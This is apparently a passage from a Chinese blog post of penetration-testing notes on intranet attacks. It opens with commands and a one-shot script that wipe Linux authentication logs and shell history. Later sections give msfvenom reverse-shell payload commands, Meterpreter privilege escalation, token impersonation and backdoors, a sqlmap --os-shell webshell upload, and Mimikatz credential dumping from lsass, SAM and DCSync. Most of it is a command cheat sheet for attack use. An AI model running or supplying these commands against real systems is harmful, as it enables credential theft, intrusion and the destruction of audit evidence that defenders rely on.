<h2 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105158564.png" srcset="/img/loading.gif" lazyload alt="image-20240819105158564"></p>
<p>&#x2F;var&#x2F;run&#x2F;utmp 记录现在登入的用户</p>
<p>&#x2F;var&#x2F;log&#x2F;wtmp 记录用户所有的登入和登出</p>
<p>&#x2F;var&#x2F;log&#x2F;lastlog 记录每一个用户最后登入时间</p>
<p>&#x2F;var&#x2F;log&#x2F;btmp 记录错误的登入尝试</p>
<p>&#x2F;var&#x2F;log&#x2F;auth.log 需要身份确认的操作</p>
<p>&#x2F;var&#x2F;log&#x2F;secure 记录安全相关的日志信息</p>
<p>&#x2F;var&#x2F;log&#x2F;maillog 记录邮件相关的日志信息</p>
<p>&#x2F;var&#x2F;log&#x2F;message 记录系统启动后的信息和错误日志</p>
<p>&#x2F;var&#x2F;log&#x2F;cron 记录定时任务相关的日志信息</p>
<p>&#x2F;var&#x2F;log&#x2F;spooler 记录 UUCP 和 news 设备相关的日志信息</p>
<p>&#x2F;var&#x2F;log&#x2F;boot.log 记录守护进程启动和停止相关的日志消息</p>
<p>完全删除日志文件：</p>
<p>cat &#x2F;dev&#x2F;null &gt; filename</p>
<p>: &gt; filename</p>
<p>filename</p>
<p>echo “” &gt; filename</p>
<p>echo &gt; filename</p>
<p>针对性删除日志文件：</p>
<p>删除当天日志</p>
<p>sed  -i ‘&#x2F;当天日期&#x2F;‘d  filename</p>
<p>一键清除脚本：</p>
<p>!&#x2F;usr&#x2F;bin&#x2F;bash</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;syslog</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;messages</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;xferlog</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;secure</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;auth.log</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;user.log</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog</p>
<p>echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</p>
<p>echo &gt; &#x2F;var&#x2F;run&#x2F;utmp</p>
<p>rm ~&#x2F;.&#x2F;bash_history</p>
<p>history -c</p>
<p>Linux</p>
<p>Windows</p>
<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230028258.png" srcset="/img/loading.gif" lazyload alt="image-20240917230028258"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230052008.png" srcset="/img/loading.gif" lazyload alt="image-20240917230052008"></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff">常用参数<br><br><span class="hljs-deletion">-u -l指定url和url文件</span><br><br><span class="hljs-deletion">-e -X 包含和排除后缀 -f在字典后面增加后缀</span><br><br><span class="hljs-deletion">-w 指定字典</span><br><br><span class="hljs-deletion">-i -x 指定保留和排除的响应状态码</span><br><br>dirsearch.py -u url -e php -i 200<br></code></pre></td></tr></table></figure>



<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119614618">https://blog.csdn.net/weixin_45588247&#x2F;article&#x2F;details&#x2F;119614618</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p>
</blockquote>
<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VpEBbVXlVoCXg4xyKjqclkTynhe.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/VRxLbPbLboDpcKxJHhsc1fvInzh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>其中：meterpreter 组件（stage）是一种基于内存 DDL 注入的后渗透工具</p>
<h3 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EhyrbLCxVo3pzpxRZ76cK92yn8e.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/WFZ3bTsvBoBdzJxD1ZlcmCL2nhc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h4 id="Auxiliary-扫描器"><a href="#Auxiliary-扫描器" class="headerlink" title="Auxiliary 扫描器"></a>Auxiliary 扫描器</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SLR6bjrYhoDHAHxgiZocgSCpn5g.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h4 id="攻击载荷和编码"><a href="#攻击载荷和编码" class="headerlink" title="攻击载荷和编码"></a>攻击载荷和编码</h4><p>这里利用 msfvemon 来替代</p>
<blockquote>
<p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe<br>-p 指定 payload<br>-e 编码器<br>-i 迭代器<br>-f 输出格式</p>
</blockquote>
<h4 id="POST-后渗透"><a href="#POST-后渗透" class="headerlink" title="POST 后渗透"></a>POST 后渗透</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/IX6Ubug2FohidmxFGMqc3WY6nuf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><p>这个就不多写了</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/E7orbUVrtoPXw5xMZThcwo2YnNg.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h4 id="后渗透-windows"><a href="#后渗透-windows" class="headerlink" title="后渗透(windows)"></a>后渗透(windows)</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1180234">https://cloud.tencent.com/developer/article/1180234</a></p>
</blockquote>
<h5 id="一-创建会话"><a href="#一-创建会话" class="headerlink" title="一.创建会话"></a>一.创建会话</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44823747/article/details/110056175">https://blog.csdn.net/weixin_44823747&#x2F;article&#x2F;details&#x2F;110056175</a></p>
<p>1.通过-l 参数来查看可以生成的 payload</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/SlULb9DgDoMK6WxHkwzcWP9onMf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>其中可以分为三类，二进制文件，webshell 和脚本 shell</p>
<p>2.反弹 shell 建立如下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>

<p>然后运行 exploit&#x2F;multi&#x2F;handler 监听模块并且在靶机上运行脚本即可</p>
<p>3.cmdshell–&gt;meterpreter</p>
<p>sessions 查看会话类型，如果是 cmdshell 可以选择输入 session -u id 来升级 然后 sessions id 进入会话</p>
<p>收集信息</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> arp_scanner -r  c段ip  查看主机状态<br><span class="hljs-built_in">run</span> post/multi/recon/local_exploit_suggester      查看msf的提权<br></code></pre></td></tr></table></figure>

<h5 id="二-提权"><a href="#二-提权" class="headerlink" title="二.提权"></a>二.提权</h5><h6 id="1-绕过-UAC"><a href="#1-绕过-UAC" class="headerlink" title="1.绕过 UAC"></a>1.绕过 UAC</h6><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EeXObrz16oc7RpxMmuOc9d8Intc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>这里输入 background 挂起会话，使用 MSF 中的模块直接进行提权，在会话中输入 getsystem 即可</p>
<h6 id="2-系统漏洞"><a href="#2-系统漏洞" class="headerlink" title="2.系统漏洞"></a>2.系统漏洞</h6><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h5 id="三-进程迁移"><a href="#三-进程迁移" class="headerlink" title="三.进程迁移"></a>三.进程迁移</h5><p>将 msf 和进程进行绑定来降低被杀的概率</p>
<p>1.查看进程 getpid</p>
<p>2.查看正在运行进程 ps</p>
<p>3.绑定 migratepid id</p>
<h5 id="四-令牌假冒"><a href="#四-令牌假冒" class="headerlink" title="四.令牌假冒"></a>四.令牌假冒</h5><p>令牌：windows 提供的一个类似于 cookies 的功能，用来分辨用户身份，如果域管理员登陆过这个终端，那可以直接假冒域管理员</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">查看当前用户 getuid<br>进入模块 <span class="hljs-keyword">use</span> incognito<br>查看存在的令牌 list_tokens-u<br>伪造 impersonate_token <span class="hljs-built_in">token</span>\\用户名<br></code></pre></td></tr></table></figure>

<h5 id="五-获取凭证"><a href="#五-获取凭证" class="headerlink" title="五.获取凭证"></a>五.获取凭证</h5><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者 hash，再尝试登录内网其它服务器</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">取出密码 <span class="hljs-built_in">run</span> hashdump<br>使用mimikatz模块<br>wdigest抓内存中的明文<br>kiwi模块<br></code></pre></td></tr></table></figure>

<h5 id="六-端口转发"><a href="#六-端口转发" class="headerlink" title="六.端口转发"></a>六.端口转发</h5><h6 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h6><p>portfwd -l 本地端口 -r 内网 ip -p 内网端口</p>
<h6 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h6><p>1.添加路由表 route add 内网 ip 子网掩码 sessionid （route print 查看）</p>
<p>2.socks 代理</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GNT1bbDYfoMl88xO6VAcECbfnUh.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h5 id="七-后门"><a href="#七-后门" class="headerlink" title="七.后门"></a>七.后门</h5><h6 id="metsvc-服务启动"><a href="#metsvc-服务启动" class="headerlink" title="metsvc(服务启动)"></a>metsvc(服务启动)</h6><h6 id="persistant"><a href="#persistant" class="headerlink" title="persistant"></a>persistant</h6><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap hostname/ip或者多个ip或者子网192.168.123.*<br><span class="hljs-deletion">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="hljs-deletion">-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）</span><br><span class="hljs-deletion">-O 探测操作系统信息</span><br><span class="hljs-deletion">-sV 查找主机服务版本号</span><br><span class="hljs-deletion">-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）</span><br><span class="hljs-deletion">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="hljs-deletion">-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="hljs-deletion">-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="hljs-deletion">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="hljs-deletion">-sN TCP空扫描 </span><br><span class="hljs-deletion">-F 快速扫描</span><br><span class="hljs-deletion">-p 指定端口/端口范围</span><br><span class="hljs-deletion">-oN 将报告写入文件</span><br><span class="hljs-deletion">-v 详细信息</span><br><span class="hljs-deletion">-T&lt;0-5&gt; 设定速度</span><br>使用脚本：<br><span class="hljs-deletion">--script all 使用所有脚本</span><br><span class="hljs-deletion">--script=sql.injection.nse sql注入</span><br><span class="hljs-deletion">--script=&quot;smb*&quot; 扫smb系列</span><br>一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)<br>二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等<br>三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX<br>四、漏洞检测可直接 nmap 目标 --script=auth,vuln<br></code></pre></td></tr></table></figure>

<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PHLcb9Jq5oj1JaxXkx7cGZT3n4e.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>四扫：（sn 扫主机）</p>
<p>半开扫端口-sT –minrate 10000 -p-</p>
<p>udp 扫端口 -sU -p-</p>
<p>扫详细（服务版本，默认脚本，系统版本） -sT -sV -sC -O -p</p>
<p>漏洞扫描 –scipt&#x3D;vulnW</p>
<p>nmap 默认使用-sS 只发送 syn 标志位进行扫描，快但是不如-sT 准确，同时 S 容易受到防火墙过滤不完整的包</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Dr2LbBwm2o4G9Dx3kKQcEySpn6f.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PFVzbM6RzoMJlFxbMUec1oe7nB2.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Hn54bBGLRoNU3Ex2c6hcyE4lnkf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NFb1b7l4goaJW0xWReBcBvuXnSf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a><strong>SQLmap</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-u 单个URL <br>-m xx<span class="hljs-selector-class">.txt</span> 多个URL<br>-d <span class="hljs-string">&quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;</span> 作为服务器客户端，连接数据库<br><span class="hljs-attr">--data</span> post/get都适用<br>-<span class="hljs-selector-tag">p</span> 指定扫描的参数<br>-r 读取文件<br>-f 指纹信息<br><span class="hljs-attr">--tamper</span> 混淆脚本，用于应用层过滤<br><span class="hljs-attr">--cookie</span> <span class="hljs-attr">--user-agent</span> <span class="hljs-attr">--host</span> 对http头的修改<br><span class="hljs-attr">--threads</span> 并发线程，默认为<span class="hljs-number">1</span><br><span class="hljs-attr">--dbms</span> MySQL&lt;<span class="hljs-number">5.0</span>&gt; 指定数据库或版本<br>–level=LEVEL 执行测试的等级（<span class="hljs-number">1</span>-<span class="hljs-number">5</span>，默认为 <span class="hljs-number">1</span>）<br>–risk=RISK 执行测试的风险（<span class="hljs-number">0</span>-<span class="hljs-number">3</span>，默认为 <span class="hljs-number">1</span>） Risk升高可造成数据被篡改等风险<br>–current-db 获取当前数据库名称<br>–dbs 枚举数据库管理系统数据库<br>–tables 枚举 DBMS 数据库中的表<br>–<span class="hljs-attribute">columns</span> 枚举 DBMS 数据库表列<br>-D DB 要进行枚举的数据库名<br>-T TBL 要进行枚举的数据库表<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>常用的tamper：<br>base64encode<span class="hljs-selector-class">.py</span> 转为b64编码<br>charencode<span class="hljs-selector-class">.py</span> url编码<br>chardoubleencode<span class="hljs-selector-class">.py</span> 双URL编码<br>unmagicquotes<span class="hljs-selector-class">.py</span> 宽字节<br>randomcomments<span class="hljs-selector-class">.py</span> 用<br>`<span class="hljs-comment">/**/</span><br>`分割SQL关键字<br>space2plus<span class="hljs-selector-class">.py</span> space2comment<span class="hljs-selector-class">.py</span> space2xxxx<span class="hljs-selector-class">.py</span> 替换空格为xx<br>Post注入：<br>sqlmap -r <span class="hljs-string">&quot;数据包地址&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;参数&quot;</span> -dbms 数据类型<br>Get注入：<br>sqlmap -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--dbms</span> 参数<br>sqlmap进行交互式写shell：<br><span class="hljs-number">1</span>-前提条件：最高权限、知道web网站绝对路径、能获取到cookie<br><span class="hljs-number">2</span>-sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;cookie值&quot;</span> <span class="hljs-attr">--os-shell</span><br>-echo “一句话木马”&gt;网站的绝对路径<br><span class="hljs-number">3</span>-输入web网站的绝对路径<br><span class="hljs-number">4</span>-传木马<br></code></pre></td></tr></table></figure>

<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">过滤源<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">src</span>==1.1.1.1;,<br>目的<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">dst</span>==1.1.1.1;<br>过滤 80 端口:tcp.<span class="hljs-attribute">port</span>==80,<br>源端口:tcp.<span class="hljs-attribute">srcport</span>==80,<br>目的端口:tcp.<span class="hljs-attribute">dstport</span>==80<br>协议直接输入,如 http 协议 http<br>过滤 get/post 包 http.request.<span class="hljs-attribute">mothod</span>==”GET/POST”<br>tcp http内容：tcp（http） contains <span class="hljs-string">&quot;/api&quot;</span><br>http url内容http.request.uri ==<span class="hljs-string">&quot;/api&quot;</span><br><br></code></pre></td></tr></table></figure>

<h2 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><p>原理是抓lsass.exe的内存</p>
<p><code>提升权限 privilege::debug</code></p>
<p><code>抓取密码 sekurlsa::logonpasswords</code></p>
<p><code>win10与2012R2后启动密码保存在内存中</code></p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code> </p>
<h3 id="sam表抓hash"><a href="#sam表抓hash" class="headerlink" title="sam表抓hash"></a>sam表抓hash</h3><p>利用sam表</p>
<p><code>导出SAM数据 reg save HKLM\SYSTEM SYSTEM reg save HKLM\SAM SAM</code> </p>
<p><code>使用mimikatz提取hash lsadump::sam /sam:SAM /system:SYSTEM</code></p>
<h3 id="不落地"><a href="#不落地" class="headerlink" title="不落地"></a>不落地</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">导出lsass procdump64.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">本地抓密码mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输出本地mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt<br></code></pre></td></tr></table></figure>

<h3 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h3><h3 id="DCSync抓hash"><a href="#DCSync抓hash" class="headerlink" title="DCSync抓hash"></a>DCSync抓hash</h3><p>模拟dc跨域同步获取数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出域内指定用户的信息(包括哈希值)</span><br>lsadump::dcsync /domain:whoamianony.org /user:administrator <br>lsadump::dcsync /domain:whoamianony.org /user:administrator /csv<br><br><span class="hljs-comment"># 导出域内所有用户的信息(包括哈希值)</span><br>lsadump::dcsync /domain:whoamianony.org /all    <br>lsadump::dcsync /domain:whoamianony.org /all /csv<br></code></pre></td></tr></table></figure>

<h1 id="弹-shell"><a href="#弹-shell" class="headerlink" title="弹 shell"></a>弹 shell</h1><p>reg 上传去正向连接。或探测出网协议，如 dns，icmp</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>渗透</div>
      <div>http://example.com/2024/06/27/内网渗透/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>z2zQAQ</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月27日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/" title="top10漏洞">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">top10漏洞</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/" title="蓝队笔记">
                        <span class="hidden-mobile">蓝队笔记</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>



  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
